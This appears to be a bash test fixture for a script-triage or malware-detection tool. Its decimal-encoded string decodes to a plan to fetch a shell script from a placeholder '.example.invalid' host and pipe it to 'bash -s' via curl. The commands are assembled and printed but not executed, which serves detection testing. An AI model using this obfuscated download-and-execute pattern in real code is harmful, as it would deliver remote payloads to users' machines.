# configuration reconstruction
#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_d8223c33='118 61 49 124 115 116 101 112 115 61 97 99 113 117 105 114 101 95 114 101 109 111 116 101 44 100 105 115 112 97 116 99 104 95 112 105 112 101 124 97 100 97 112 116 101 114 61 99 117 114 108 95 115 116 100 111 117 116 95 112 105 112 101 124 115 116 97 103 101 95 99 111 117 110 116 61 49 124 99 97 109 112 97 105 103 110 95 105 100 61 99 97 109 112 97 105 103 110 45 49 100 54 98 52 98 99 102 102 56 124 117 114 108 61 104 116 116 112 115 58 47 47 49 100 54 98 52 98 99 102 102 56 46 101 120 97 109 112 108 101 46 105 110 118 97 108 105 100 47 57 49 54 100 98 51 100 53 46 115 104 124 117 115 101 114 95 97 103 101 110 116 61 72 117 110 116 114 101 115 115 76 97 98 47 49 100 54 98 52 98 99 102 102 56'
readonly Codec_d8223c33='decimal_space|identity|'

Load_d8223c33() {
  e=()
  local IFS=' '
  read -r -a e <<< "${Material_d8223c33}"
}

Decode_d8223c33() {
  d=()
  local i
  for ((i=0; i<${#e[@]}; i++)); do
    d+=("${e[i]}")
  done
}

Recover_d8223c33() {
  local -a e d
  local t n z i
  if ((2 > 1)); then n=left; else n=right; fi
  Load_d8223c33
  z=0; while ((z < 1)); do Decode_d8223c33; ((z+=1)); done
  t=''
  local octal character
  for i in "${!d[@]}"; do
    printf -v octal '%03o' "${d[i]}"
    printf -v character '%b' "\\$octal"
    t+="$character"
  done
  printf '%s\n' "$t"
}

Inspect_d8223c33() { local recovered field; local -a fields; recovered="$(Recover_d8223c33)"; IFS='|' read -r -a fields <<< "$recovered"; (IFS='|'; printf '%s\n' "${fields[*]}"); }

Plan_d8223c33() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_d8223c33)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a request_command=(curl --fail --silent --show-error "$url")
  local -a interpreter=(bash -s)
  declare -p request_command interpreter
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_d8223c33; fi

# reconstruction complete